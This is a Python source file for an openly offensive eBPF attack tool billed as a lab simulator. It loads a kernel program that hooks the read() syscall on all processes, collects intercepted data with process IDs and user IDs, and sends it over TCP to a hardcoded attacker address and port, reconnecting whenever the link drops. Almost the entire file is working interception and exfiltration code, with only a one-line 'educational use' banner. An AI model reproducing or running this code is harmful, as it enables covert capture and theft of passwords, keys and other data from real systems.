#!/usr/bin/env python3
"""
exfiltrate.py - eBPF Attack: Userspace Loader and Exfiltrator
Runs on the VICTIM Ubuntu VM (10.10.0.30)

What this does:
1. Loads the eBPF kernel program (intercept.c) into the kernel
2. Attaches it to the read() syscall tracepoints
3. Reads intercepted data from the ring buffer
4. Exfiltrates it over TCP to the attacker's receiver on Kali

Usage: sudo python3 exfiltrate.py
Requires: bcc (pip install bcc or apt install python3-bpfcc)
"""

import socket
import struct
import ctypes
import sys
import os
import time
import signal
from datetime import datetime

# ============================================================
# CONFIGURATION - adjust these for your lab setup
# ============================================================
ATTACKER_IP = "10.10.0.40"   # attacker vm
ATTACKER_PORT = 4444          # Port receiver.py listens on
VICTIM_IP = "10.10.0.20"      # This machine's IP (for logging)
# ============================================================

# Try to import BCC - the Python bindings for eBPF
try:
    from bcc import BPF, PerfType, PerfSWConfig
except ImportError:
    print("[!] BCC not found. Install with: sudo apt install python3-bpfcc")
    print("[!] Or: pip install bcc")
    sys.exit(1)

# Check we're running as root
if os.geteuid() != 0:
    print("[!] This must be run as root (sudo)")
    sys.exit(1)

# eBPF program source - reads intercept.c from same directory
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
BPF_SOURCE = os.path.join(SCRIPT_DIR, "intercept.c")

if not os.path.exists(BPF_SOURCE):
    print(f"[!] Cannot find {BPF_SOURCE}")
    print("[!] Make sure intercept.c is in the same directory")
    sys.exit(1)

# Global socket for exfiltration
exfil_sock = None
running = True

def signal_handler(sig, frame):
    global running
    print("\n[*] Shutting down...")
    running = False

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)


def connect_to_attacker():
    """Establish TCP connection to the attacker's receiver"""
    global exfil_sock
    while running:
        try:
            print(f"[*] Connecting to attacker at {ATTACKER_IP}:{ATTACKER_PORT}...")
            exfil_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            exfil_sock.settimeout(5)
            exfil_sock.connect((ATTACKER_IP, ATTACKER_PORT))
            print(f"[+] Connected to attacker at {ATTACKER_IP}:{ATTACKER_PORT}")
            return True
        except (ConnectionRefusedError, socket.timeout, OSError) as e:
            print(f"[!] Connection failed: {e}. Retrying in 3 seconds...")
            time.sleep(3)
    return False


def send_to_attacker(data: bytes):
    """Send intercepted data to attacker with length prefix"""
    global exfil_sock
    try:
        # Prefix with 4-byte length so receiver knows packet boundaries
        length = struct.pack(">I", len(data))
        exfil_sock.sendall(length + data)
        return True
    except (BrokenPipeError, OSError):
        print("[!] Connection to attacker lost, reconnecting...")
        connect_to_attacker()
        return False


def format_event(pid, uid, comm, bytes_read, data_bytes):
    """Format an intercepted event as a readable string"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Try to decode as text, fall back to hex for binary data
    try:
        data_str = data_bytes.decode('utf-8', errors='replace').strip()
        # Remove null bytes and non-printable chars for display
        data_str = ''.join(c if c.isprintable() else '.' for c in data_str)
    except Exception:
        data_str = data_bytes.hex()

    return (
        f"[{timestamp}] "
        f"PID={pid} UID={uid} COMM={comm.decode('utf-8', errors='replace').strip(chr(0))} "
        f"BYTES={bytes_read} "
        f"DATA={data_str[:200]}"  # truncate very long data
    )


def load_and_run():
    """Load the eBPF program and start intercepting"""
    
    print("[*] Loading eBPF program...")
    
    # Read the eBPF C source
    with open(BPF_SOURCE, 'r') as f:
        bpf_source = f.read()
    
    # Compile and load into kernel
    try:
        b = BPF(text=bpf_source)
        print("[+] eBPF program loaded into kernel successfully")
    except Exception as e:
        print(f"[!] Failed to load eBPF program: {e}")
        print("[!] Make sure kernel headers are installed:")
        print("[!]   sudo apt install linux-headers-$(uname -r)")
        sys.exit(1)

    # Attach to read() syscall tracepoints
    try:
        b.attach_tracepoint(tp="syscalls:sys_enter_read", fn_name="trace_read_enter")
        b.attach_tracepoint(tp="syscalls:sys_exit_read", fn_name="trace_read_exit")
        print("[+] Attached to read() syscall tracepoints")
    except Exception as e:
        print(f"[!] Failed to attach tracepoints: {e}")
        sys.exit(1)

    print(f"[*] Intercepting read() syscalls on all processes...")
    print(f"[*] Exfiltrating to {ATTACKER_IP}:{ATTACKER_PORT}")
    print("[*] Press Ctrl+C to stop\n")

    # Define the event structure matching our eBPF struct
    class Event(ctypes.Structure):
        _fields_ = [
            ("pid", ctypes.c_uint32),
            ("uid", ctypes.c_uint32),
            ("bytes_read", ctypes.c_int64),
            ("data", ctypes.c_char * 256),
            ("comm", ctypes.c_char * 16),
        ]

    intercepted_count = 0

    # Callback called every time eBPF submits an event to the ring buffer
    def handle_event(ctx, data, size):
        nonlocal intercepted_count
        
        event = ctypes.cast(data, ctypes.POINTER(Event)).contents
        
        # Skip our own process to avoid feedback loop
        if event.pid == os.getpid():
            return
        
        # Format the event
        formatted = format_event(
            event.pid,
            event.uid,
            event.comm,
            event.bytes_read,
            bytes(event.data[:event.bytes_read if event.bytes_read < 256 else 256])
        )
        
        intercepted_count += 1
        print(f"[INTERCEPT #{intercepted_count}] {formatted}")
        
        # Exfiltrate to attacker
        send_to_attacker(formatted.encode('utf-8'))

    # Open the ring buffer and set callback
    b["intercepted_data"].open_ring_buffer(handle_event)

    print("[+] Ring buffer opened, waiting for intercepted data...\n")

    # Main loop - poll ring buffer every 100ms
    while running:
        try:
            b.ring_buffer_poll(100)
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"[!] Ring buffer error: {e}")
            break

    print(f"\n[*] Total events intercepted: {intercepted_count}")
    print("[*] Detaching eBPF program from kernel...")
    b.cleanup()
    print("[*] Done")


def main():
    print("=" * 60)
    print("  eBPF Attack Simulator - Victim Side Exfiltrator")
    print("  For educational/research use in lab environment only")
    print("=" * 60)
    print()
    print(f"[*] Victim VM:   {VICTIM_IP}")
    print(f"[*] Attacker VM: {ATTACKER_IP}:{ATTACKER_PORT}")
    print()

    # Connect to attacker first
    if not connect_to_attacker():
        print("[!] Could not connect to attacker. Is receiver.py running on Kali?")
        sys.exit(1)

    # Load eBPF and start intercepting
    load_and_run()

    # Cleanup
    if exfil_sock:
        exfil_sock.close()


if __name__ == "__main__":
    main()
